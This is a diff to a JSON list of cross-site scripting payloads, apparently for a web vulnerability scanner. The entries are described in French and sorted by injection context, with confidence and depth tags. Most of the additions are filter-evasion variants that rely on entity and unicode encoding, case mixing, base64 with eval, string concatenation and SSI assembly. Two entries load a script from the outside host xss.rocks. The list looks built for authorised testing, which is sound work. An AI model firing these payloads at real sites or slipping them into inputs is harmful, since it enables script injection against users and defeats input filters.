@@ -9,41 +9,79 @@
       {"payload": "<details open ontoggle=alert(1)>", "description": "Detail toggle event", "confidence_hint": 85, "depth": "extended"},
       {"payload": "<body onload=alert(1)>", "description": "Body onload — vecteur classique alternatif", "confidence_hint": 80, "depth": "extended"},
       {"payload": "<select autofocus onfocus=alert(1)>", "description": "Autofocus — déclenche sans interaction utilisateur", "confidence_hint": 80, "depth": "extended"},
-      {"payload": "<marquee onstart=alert(1)>", "description": "Marquee onstart — tag peu filtré", "confidence_hint": 70, "depth": "aggressive"}
+      {"payload": "<marquee onstart=alert(1)>", "description": "Marquee onstart — tag peu filtré", "confidence_hint": 70, "depth": "aggressive"},
+      {"payload": "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\">", "description": "Triple quote dans un attribut IMG — confond le parseur et laisse passer le SCRIPT suivant", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "<<SCRIPT>alert(1);//\\<</SCRIPT>", "description": "Double chevron ouvrant + commentaire — déjoue une détection par appariement de crochets", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>", "description": "Ponctuation arbitraire entre le nom du handler et '=' (tolérée par Gecko) — bypass filtre mot-clé 'onload='", "confidence_hint": 45, "depth": "aggressive"},
+      {"payload": "<isindex type=image src=1 onerror=alert(1)>", "description": "Tag isindex obsolète avec type image — peu couvert par les filtres modernes", "confidence_hint": 50, "depth": "aggressive"},
+      {"payload": "<video><source onerror=\"alert(1)\"></video>", "description": "Handler onerror sur une source vidéo — famille de tags média peu filtrée", "confidence_hint": 65, "depth": "extended"},
+      {"payload": "<SCRIPT/SRC=\"//xss.rocks/xss.js\"></SCRIPT>", "description": "Caractère non-alphanumérique ('/') entre le nom du tag et l'attribut — bypass filtre regex basé sur l'espace", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT>alert(1)</SCRIPT>'\"-->", "description": "Assemblage via deux directives SSI — aucune sortie unique ne contient jamais '<SCRIPT' (nécessite SSI actif)", "confidence_hint": 35, "depth": "aggressive"},
+      {"payload": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"//xss.rocks/xss.js\"></SCRIPT>", "description": "Tag script reconstitué via document.write — jamais présent sous forme complète dans la réponse brute", "confidence_hint": 40, "depth": "aggressive"}
     ],
     "attribute_context": [
       {"payload": "\" onmouseover=\"alert(1)",  "description": "Break attribute + event handler", "confidence_hint": 85},
       {"payload": "' onfocus='alert(1)' autofocus='", "description": "Auto-trigger via focus", "confidence_hint": 85, "depth": "extended"},
       {"payload": "\" autofocus onfocus=\"alert(1)", "description": "Variante double-quote de l'auto-trigger focus", "confidence_hint": 80, "depth": "extended"},
       {"payload": "\" onmouseover=\"javaSCRIPT&colon;alert&lpar;1&rpar;", "description": "Obfuscation par entités HTML (bypass filtre mot-clé)", "confidence_hint": 70, "depth": "extended"},
-      {"payload": "\"><img src=x:x onerror=alert(1)>", "description": "Sort de l'attribut puis injecte un nouveau tag", "confidence_hint": 80, "depth": "extended"}
+      {"payload": "\"><img src=x:x onerror=alert(1)>", "description": "Sort de l'attribut puis injecte un nouveau tag", "confidence_hint": 80, "depth": "extended"},
+      {"payload": "'><img src=x onerror=alert(1)>", "description": "Variante quote simple de la sortie d'attribut + nouveau tag (si l'app utilise ' plutôt que \")", "confidence_hint": 80, "depth": "extended"},
+      {"payload": " autofocus onfocus=alert(1) x=", "description": "Sortie d'un attribut NON quoté via un espace — ajoute un nouvel attribut événementiel", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "\"><iframe srcdoc=\"<script>alert(1)</script>\">", "description": "Sort de l'attribut puis injecte un iframe srcdoc — vecteur moderne sans onerror/onload", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "x\" style=\"background-image:url(javascript:alert(1))\" y=\"", "description": "Injection dans un attribut style — javascript: dans url() (IE historique uniquement, navigateurs modernes non vulnérables)", "confidence_hint": 30, "depth": "aggressive"},
+      {"payload": "%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "description": "Sortie d'attribut sur-encodée en URL — bypass filtre qui ne décode qu'une seule fois", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "\\\" onmouseover=\\\"alert(1)", "description": "Neutralise un échappement naïf type addslashes() (backslash avant le guillemet)", "confidence_hint": 55, "depth": "aggressive"}
     ],
     "js_context": [
       {"payload": "';alert(1);//",              "description": "Sort de string + injecte", "confidence_hint": 95},
       {"payload": "\";alert(1);//",             "description": "Variante double-quote", "confidence_hint": 95},
       {"payload": "</script><script>alert(1)</script>", "description": "Break script tag", "confidence_hint": 90, "depth": "extended"},
       {"payload": "\\';alert(1);//", "description": "Neutralise l'échappement naïf (backslash avant le guillemet)", "confidence_hint": 70, "depth": "extended"},
-      {"payload": "';alert(String.fromCharCode(88,83,83));//", "description": "Obfuscation via String.fromCharCode (bypass filtre mot-clé)", "confidence_hint": 75, "depth": "extended"}
+      {"payload": "';alert(String.fromCharCode(88,83,83));//", "description": "Obfuscation via String.fromCharCode (bypass filtre mot-clé)", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "\\\";alert(1);//", "description": "Neutralise l'échappement naïf (backslash avant le guillemet double)", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "`;alert(1);//", "description": "Sort d'un template literal ES6 (backtick) — contexte de quote distinct de ' et \"", "confidence_hint": 65, "depth": "extended"},
+      {"payload": "';(alert)(1);//", "description": "Parenthèses autour du nom de fonction — bypass filtre regex sur 'alert('", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "';top[\"al\"+\"ert\"](1);//", "description": "Concatenation de chaînes pour reconstituer 'alert' — bypass filtre mot-clé", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "';top['al\\x65rt'](1);//", "description": "Échappement hexadécimal dans l'identifiant 'al\\x65rt' — bypass filtre mot-clé", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "</script><img src=x onerror=alert(1)>", "description": "Ferme le bloc script puis utilise un tag non-script — contourne un filtre qui bloque un nouveau <script>", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "';alert?.(1);//", "description": "Optional chaining (ES2020) sur l'appel — bypass filtre regex attendant 'alert('", "confidence_hint": 60, "depth": "aggressive"}
     ],
     "url_context": [
       {"payload": "javascript:alert(1)",         "description": "Pseudo-protocol", "confidence_hint": 80},
       {"payload": "data:text/html,<script>alert(1)</script>", "description": "Data URI", "confidence_hint": 75, "depth": "extended"},
       {"payload": "javascript:alert(document.domain)", "description": "Variante confirmant le domaine", "confidence_hint": 75, "depth": "extended"},
-      {"payload": "javascript://%0aalert(1)//", "description": "Commentaire JS (//) + retour ligne — bypass filtre regex sur javascript:", "confidence_hint": 65, "depth": "aggressive"}
+      {"payload": "javascript://%0aalert(1)//", "description": "Commentaire JS (//) + retour ligne — bypass filtre regex sur javascript:", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "jAvAsCrIpT:alert(1)", "description": "Casse mixte du scheme — bypass filtre mot-clé sensible à la casse", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "description": "Data URI encodée en base64 — bypass filtre scannant la chaîne littérale '<script'", "confidence_hint": 65, "depth": "extended"},
+      {"payload": "java\tscript:alert(1)", "description": "Tabulation à l'intérieur du mot 'javascript' — ignorée par le navigateur, casse le filtre mot-clé", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "java&#x0A;script:alert(1)", "description": "Retour ligne encodé (entité hex) à l'intérieur du mot 'javascript' — même principe que la tabulation", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58alert(1)", "description": "'javascript:' entièrement orthographié en entités décimales sans point-virgule — bypass filtre sur la chaîne littérale", "confidence_hint": 50, "depth": "aggressive"},
+      {"payload": "&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3Aalert(1)", "description": "'javascript:' orthographié en entités hexadécimales sans point-virgule — variante d'encodage de la précédente", "confidence_hint": 50, "depth": "aggressive"},
+      {"payload": "&#14;javascript:alert(1)", "description": "Caractère de contrôle en tête d'URL, ignoré par le navigateur avant le scheme — bypass filtre sur préfixe attendu", "confidence_hint": 45, "depth": "aggressive"},
+      {"payload": "javascript:\\u0061lert(1)", "description": "Échappement unicode dans le nom 'alert' (valide comme identifiant JS) — bypass filtre mot-clé sur le payload plutôt que sur le scheme", "confidence_hint": 55, "depth": "aggressive"}
     ],
     "svg_context": [
       {"payload": "<svg onload=alert(1)>", "description": "SVG onload", "confidence_hint": 85},
       {"payload": "<svg onload=&#97&#108&#101&#114&#116(1)>", "description": "Obfuscation par entités HTML du mot alert (bypass filtre mot-clé)", "confidence_hint": 65, "depth": "extended"},
-      {"payload": "<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s></animatetransform></svg>", "description": "SVG animate — déclenche sans onload/onerror", "confidence_hint": 65, "depth": "aggressive"}
+      {"payload": "<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s></animatetransform></svg>", "description": "SVG animate — déclenche sans onload/onerror", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "<svg><script>alert(1)</script></svg>", "description": "Element script imbriqué dans un SVG — mécanisme distinct des handlers onload/onerror", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=20 y=20>XSS</text></a></svg>", "description": "Lien xlink:href javascript: dans un SVG — nécessite un clic (vecteur distinct, basé sur navigation)", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "<svg onload=alert(1) xmlns=\"http://www.w3.org/2000/svg\">", "description": "Namespace SVG explicite — scénario d'un SVG servi en standalone (ex: upload d'avatar en image/svg+xml)", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>", "description": "foreignObject — embarque du HTML dans un SVG, contourne un sanitizer qui ne récurse pas dans ce tag", "confidence_hint": 55, "depth": "aggressive"}
     ],
     "img_context": [
       {"payload": "<img src=x onerror=alert(1)>", "description": "IMG onerror", "confidence_hint": 85},
       {"payload": "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">", "description": "Obfuscation via String.fromCharCode (bypass filtre mot-clé)", "confidence_hint": 75, "depth": "extended"},
-      {"payload": "<img lowsrc=\"javascript:alert(1)\">", "description": "LOWSRC javascript: — vecteur historique (IE/Trident)", "confidence_hint": 50, "depth": "aggressive"}
+      {"payload": "<img lowsrc=\"javascript:alert(1)\">", "description": "LOWSRC javascript: — vecteur historique (IE/Trident)", "confidence_hint": 50, "depth": "aggressive"},
+      {"payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "description": "Obfuscation base64 + eval/atob — mécanisme distinct de fromCharCode", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "<img src=x:alert(alt) onerror=eval(src) alt=0>", "description": "Le src devient lui-même le code exécuté via eval(src), en référençant l'attribut alt", "confidence_hint": 50, "depth": "aggressive"},
+      {"payload": "<img src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\">", "description": "Lookup par crochets + échappement unicode de l'identifiant — bypass filtre mot-clé distinct de fromCharCode", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "<img src=x onerror=top[\"al\"+\"ert\"](1)>", "description": "Concatenation de chaînes pour reconstituer 'alert' dans le handler onerror", "confidence_hint": 55, "depth": "aggressive"}
     ],
     "polyglot": [
       {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "description": "Polyglot XSS multi-contexte", "confidence_hint": 90},
-      {"payload": "'\";!--\"<XSS>=&{()}", "description": "Polyglot court — casse quote/commentaire/tag simultanément", "confidence_hint": 60, "depth": "extended"}
+      {"payload": "'\";!--\"<XSS>=&{()}", "description": "Polyglot court — casse quote/commentaire/tag simultanément", "confidence_hint": 60, "depth": "extended"},
+      {"payload": "javascript:/*--></title></style></textarea></script></xmp> <svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>", "description": "Polyglot de l'OWASP XSS Filter Evasion Cheat Sheet — traverse HTML/attribut/JS/SVG, distinct du polyglot déjà présent", "confidence_hint": 75, "depth": "aggressive"}
     ]
   }
 }
